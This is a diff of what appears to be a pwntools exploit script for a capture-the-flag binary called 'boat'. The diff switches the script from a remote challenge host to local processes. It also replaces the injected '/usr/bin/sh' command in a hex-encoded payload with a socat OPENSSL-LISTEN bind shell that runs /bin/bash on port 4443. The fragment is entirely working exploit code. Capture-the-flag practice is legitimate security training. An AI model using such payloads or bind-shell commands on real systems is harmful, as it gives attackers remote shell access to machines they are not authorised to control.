@@ -20,11 +20,11 @@ ld = ELF("./ld-linux.so.2")
 # input()
 os.system("python3 ./chall-setup.py")
 p = remote('be.ax', 32624)
-# p2= process(["./boat","1032"])
+p2= process(["./boat","1032"])
 # process(["./boat","1033"])
 # process(["./boat","1035"])
 # process(["./boat","1024"])
-# p = process(["./boat","1031"])
+p = process(["./boat","1031"])
 def gdbs():
     gdb.attach(p, gdbscript="""
     # brva 0x2826 
@@ -98,7 +98,7 @@ def test(key,iv,libcs,base):
     payload += b"03"
     payload += b"03"
     payload += b"03"
-    payload += b"/usr/bin/sh".hex().encode()
+    payload += b"socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash".hex().encode()
     send(payload)
 
     payload = b'a'*(7*2)
